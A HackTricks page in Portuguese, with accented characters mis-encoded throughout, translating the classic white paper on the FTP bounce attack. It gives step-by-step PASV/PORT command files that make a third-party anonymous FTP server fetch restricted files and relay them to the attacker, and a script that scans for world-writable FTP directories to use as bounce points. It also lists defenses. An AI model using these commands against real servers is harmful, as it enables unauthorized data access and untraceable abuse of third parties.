```markdown
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Resumo

Se voc√™ tem acesso a um servidor FTP bounce, voc√™ pode faz√™-lo solicitar arquivos de outro servidor FTP \(onde voc√™ conhece algumas credenciais\) e baixar esse arquivo para o seu pr√≥prio servidor.

## Requisitos

Credenciais v√°lidas de FTP no servidor FTP Intermedi√°rio
Credenciais v√°lidas de FTP no servidor FTP V√≠tima
Ambos os servidores aceitam o comando PORT \(ataque FTP bounce\)
Voc√™ pode escrever dentro de algum diret√≥rio do servidor FTP Intermedi√°rio
O servidor intermedi√°rio ter√° mais acesso dentro do servidor FTP V√≠tima do que voc√™ por algum motivo \(√© isso que voc√™ vai explorar\)

## Passos

1. Conecte-se ao seu pr√≥prio servidor FTP e torne a conex√£o passiva \(comando pasv\) para faz√™-lo escutar em um diret√≥rio onde o servi√ßo da v√≠tima enviar√° o arquivo
2. Crie o arquivo que ser√° enviado do servidor FTP Intermedi√°rio para o servidor V√≠tima \(o exploit\). Este arquivo ser√° um texto simples dos comandos necess√°rios para autenticar contra o servidor V√≠tima, mudar o diret√≥rio e baixar um arquivo para o seu pr√≥prio servidor.
3. Conecte-se ao servidor FTP Intermedi√°rio e fa√ßa o upload do arquivo anterior
4. Fa√ßa o servidor FTP Intermedi√°rio estabelecer uma conex√£o com o servidor v√≠tima e enviar o arquivo de exploit
5. Capture o arquivo no seu pr√≥prio servidor FTP
6. Delete o arquivo de exploit do servidor FTP Intermedi√°rio



Todas as informa√ß√µes neste post foram extra√≠das de: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# O Ataque FTP Bounce

Este texto discute um dos muitos poss√≠veis usos do "ataque de bounce do servidor FTP". O mecanismo utilizado √© provavelmente bem conhecido, mas at√© o momento o interesse em detalhar ou corrigi-lo parece baixo ou inexistente. Este exemplo em particular demonstra mais uma maneira pela qual a maioria das "restri√ß√µes de exporta√ß√£o" eletronicamente aplicadas s√£o completamente in√∫teis e triviais de contornar. Foi escolhido na tentativa de fazer o leitor perceber que existem alguns aspectos realmente mal concebidos do protocolo FTP padr√£o.

Agradecimentos tamb√©m a Alain Knaff em imag.fr por uma discuss√£o breve, mas interessante, sobre alguns desses problemas h√° alguns meses, o que me fez pensar mais profundamente sobre eles.

## O motivo

Voc√™ √© um usu√°rio em foreign.fr, com endere√ßo IP F.F.F.F, e quer recuperar o c√≥digo-fonte criptogr√°fico de crypto.com nos EUA. O servidor FTP em crypto.com est√° configurado para permitir sua conex√£o, mas negar acesso aos fontes criptogr√°ficos porque seu endere√ßo IP de origem √© de um site fora dos EUA \[tanto quanto o servidor FTP pode determinar a partir do DNS, isto √©\]. De qualquer forma, voc√™ n√£o pode recuperar diretamente o que deseja do servidor de crypto.com.

No entanto, crypto.com permitir√° que ufred.edu baixe fontes criptogr√°ficas porque ufred.edu tamb√©m est√° nos EUA. Voc√™ sabe que /incoming em ufred.edu √© um diret√≥rio mundialmente grav√°vel onde qualquer usu√°rio an√¥nimo pode soltar arquivos e l√™-los de volta. O endere√ßo IP de crypto.com √© C.C.C.C.

## O ataque

Isso pressup√µe que voc√™ tenha um servidor FTP que faz modo passivo. Abra uma conex√£o FTP para o endere√ßo IP real da sua pr√≥pria m√°quina \[n√£o localhost\] e fa√ßa login. Mude para um diret√≥rio conveniente onde voc√™ tenha acesso de escrita, e ent√£o fa√ßa:
```
```text
pasv
stor foobar
```
```markdown
Tome nota do endere√ßo e da porta que s√£o retornados do comando PASV, F,F,F,F,X,X. Esta sess√£o FTP agora ficar√° inativa, ent√£o minimize-a ou mude para outra janela ou algo assim para prosseguir com o resto.

Construa um arquivo contendo comandos do servidor FTP. Vamos chamar este arquivo de "`instrs`". Ele ter√° a seguinte apar√™ncia:
```
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
```
Abra uma conex√£o FTP com ufred.edu, fa√ßa login anonimamente e acesse /incoming. Agora digite o seguinte nesta sess√£o FTP, que transfere uma c√≥pia do seu arquivo "`instrs`" e depois diz ao servidor FTP de ufred.edu para se conectar ao servidor FTP de crypto.com usando seu arquivo como os comandos:
```
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` agora deve aparecer como "`foobar`" em sua m√°quina atrav√©s da sua primeira conex√£o FTP. Se a conex√£o com ufred.edu n√£o terminou por si mesma devido a um bug comum do servidor, limpe excluindo "`instrs`" e saindo. Caso contr√°rio, voc√™ ter√° que se reconectar para terminar.

##  Discuss√£o

Existem v√°rias variantes disso. Sua conex√£o ouvinte PASV pode ser aberta em qualquer m√°quina que voc√™ tenha acesso de escrita de arquivo -- a sua pr√≥pria, outra conex√£o com ufred.edu ou em algum lugar completamente n√£o relacionado. Na verdade, nem precisa ser um servidor FTP -- qualquer utilit√°rio que escute em uma porta TCP conhecida e leia dados brutos para um arquivo servir√°. Uma conex√£o de dados FTP em modo passivo √© simplesmente uma maneira conveniente de fazer isso.

Os nulos extras no final do arquivo de comando s√£o para preencher as janelas TCP em ambas as extremidades da conex√£o ufred -&gt; crypto e garantir que a conex√£o de comando permane√ßa aberta tempo suficiente para que toda a sess√£o seja executada. Caso contr√°rio, a maioria dos servidores FTP tende a abortar todas as transfer√™ncias e processamento de comandos quando a conex√£o de controle √© encerrada prematuramente. O tamanho dos dados √© suficiente para preencher as janelas de recebimento e transmiss√£o, que em alguns sistemas operacionais s√£o bastante grandes \[na ordem de 30K\]. Voc√™ pode reduzir isso se souber quais sistemas operacionais est√£o em cada extremidade e a soma dos tamanhos padr√£o de suas janelas TCP. Ele √© dividido em linhas de 250 caracteres para evitar estouro de buffers de comando no servidor alvo -- provavelmente acad√™mico, j√° que voc√™ j√° disse ao servidor para encerrar.

Se crypto.com proibir \*qualquer\* conex√£o de cliente FTP de voc√™ em foreign.fr e voc√™ precisar ver quais arquivos est√£o onde, voc√™ sempre pode colocar "`list -aR`" no seu arquivo de comando e obter uma listagem de diret√≥rio de toda a √°rvore via ufred.

Voc√™ pode ter que recuperar seu arquivo de comando para o servidor FTP do alvo em modo ASCII em vez de modo bin√°rio. Alguns servidores FTP podem lidar com novas linhas brutas, mas outros podem precisar de linhas de comando terminadas por pares CRLF. Tenha isso em mente ao recuperar arquivos para daemons que n√£o sejam servidores FTP tamb√©m.

##  Outras possibilidades

Apesar do fato de que tais conex√µes de terceiros s√£o apenas de m√£o √∫nica, elas podem ser usadas para todo tipo de coisa. M√©todos semelhantes podem ser usados para postar e-mails e not√≠cias praticamente n√£o rastre√°veis, atacar servidores em v√°rios sites, encher discos, tentar pular firewalls e, geralmente, ser irritante e dif√≠cil de rastrear ao mesmo tempo. Um pouco de reflex√£o trar√° a realiza√ß√£o de in√∫meras outras possibilidades assustadoras.

Conex√µes lan√ßadas dessa maneira v√™m da porta de origem 20, que alguns sites permitem passar por seus firewalls em um esfor√ßo para lidar com o problema "ftp-data". Para alguns prop√≥sitos, isso pode ser a pr√≥xima melhor coisa a ataques com rota de origem, e √© prov√°vel que tenha sucesso onde o roteamento de origem falha contra filtros de pacotes. E tudo isso √© poss√≠vel pela forma como a especifica√ß√£o do protocolo FTP foi escrita, permitindo que conex√µes de controle venham de qualquer lugar e conex√µes de dados v√£o para qualquer lugar.

##  Defesas

Sempre haver√° sites na rede com servidores FTP antigos e diret√≥rios grav√°veis que permitem esse tipo de tr√°fego, ent√£o dizer "consertar todos os servidores FTP" √© a resposta errada. Mas voc√™ pode proteger o seu pr√≥prio contra ser um ponto de salto de terceiros e ter outro usado contra voc√™.

A primeira coisa √≥bvia a fazer √© permitir que um servidor FTP fa√ßa conex√µes de dados apenas para o mesmo host de onde a conex√£o de controle se originou. Isso n√£o impede o ataque acima, √© claro, j√° que o ouvinte PASV poderia estar facilmente em ufred.edu e, portanto, atender a esse requisito, mas impede que \*seu\* site seja um ponto de salto potencial. Isso tamb√©m quebra o conceito de "proxy FTP", mas escondido em algum lugar neste par√°grafo est√° um violino muito pequeno.

A pr√≥xima coisa √≥bvia √© proibir conex√µes de controle FTP que venham de portas reservadas, ou pelo menos da porta 20. Isso impede o cen√°rio acima como declarado.

Ambas as coisas, al√©m do usual sobre bloquear pacotes com rota de origem e outras vias de falsifica√ß√£o, s√£o necess√°rias para prevenir hacks desse tipo. E pense se voc√™ realmente precisa de um diret√≥rio "incoming" aberto.

Permitir apenas conex√µes de dados de cliente em modo passivo √© outra possibilidade, mas ainda existem muitos clientes FTP em uso que n√£o s√£o conscientes do modo passivo.

##  "Um consenso frouxo e c√≥digo em execu√ß√£o"

H√° algum trabalho existente abordando isso dispon√≠vel aqui em avian.org \[e est√° h√° v√°rios meses, devo acrescentar\] no "[arquivo fixkits](ftp://ftp.avian.org:/src/fixkits/)". V√°rias modifica√ß√µes para wu-ftpd-2.4 s√£o apresentadas, que incluem c√≥digo para prevenir e registrar tentativas de usar comandos PORT falsos. Corre√ß√µes de seguran√ßa recentes de outros lugares tamb√©m est√£o inclu√≠das, juntamente com suporte s/key e v√°rias op√ß√µes de compila√ß√£o para refor√ßar a seguran√ßa para aplica√ß√µes espec√≠ficas.

Stan Barber em academ.com est√° trabalhando na fus√£o dessas e v√°rias outras corre√ß√µes em um verdadeiro lan√ßamento atualizado do wu-ftpd. H√° um par de outros esfor√ßos divergentes em andamento. Em nenhum lugar √© afirmado que qualquer um desses trabalhos esteja completo ainda, mas √© um come√ßo em dire√ß√£o a algo que tenho em mente h√° um tempo -- um lan√ßamento em toda a rede do wu-ftpd-2.5, com contribui√ß√µes de toda a rede. O servidor wu-ftpd se tornou muito popular, mas precisa urgentemente de mais uma atualiza√ß√£o de seguran√ßa. Seria bom reunir todas as melhorias em um lugar coordenado, e parece que isso vai acontecer. Tudo isso ainda n√£o ajudar√° pessoas que insistem em executar servidores fornecidos por fornecedores, √© claro.

Verificar a sanidade da porta de origem da conex√£o do cliente n√£o √© implementada especificamente nas corre√ß√µes do servidor FTP, mas em modifica√ß√µes no pacote tcp-wrappers de Wietse, j√° que esse problema √© mais geral. Uma simples op√ß√£o PORT √© adicionada que nega conex√µes de faixas configur√°veis de portas de origem no est√°gio tcpd, antes de um daemon chamado ser executado.

Algumas dessas coisas s√£o apontadas por [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) na √°rea de FTP an√¥nimo aqui. Leia este roteiro antes de pegar outras coisas.

##  Notas

Adicionar os nulos no final do arquivo de comando foi a chave para fazer isso funcionar contra uma variedade de daemons. Simplesmente enviar os dados desejados geralmente falharia devido ao fechamento imediato sinalizando ao daemon para desistir.

Se a WUSTL n√£o desistiu completamente do projeto wu-ftpd, eles est√£o mantendo muito sil√™ncio sobre trabalhos futuros. Bryan O'Connor parece ter muitos outros projetos para atender agora...

Este √© um script trivial para encontrar diret√≥rios e arquivos de propriedade do ftp e grav√°veis pelo mundo em um servidor FTP an√¥nimo baseado em unix. Voc√™ ficaria surpreso com quantos desses "pontos de salto" grav√°veis aparecem ap√≥s uma curta execu√ß√£o de algo assim. Voc√™ ter√° que verificar mais tarde se pode tanto PUT quanto GET arquivos de tais lugares; alguns servidores protegem arquivos carregados contra leitura. Muitos n√£o o fazem e depois se perguntam por que est√£o entre os dez principais sites de warez desta semana...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
Suponha que isto possa ser chamado de um white paper. Est√° dispon√≠vel em avian.org em [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) e tamb√©m foi postado em v√°rios lugares relevantes. \_H\* 950712

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
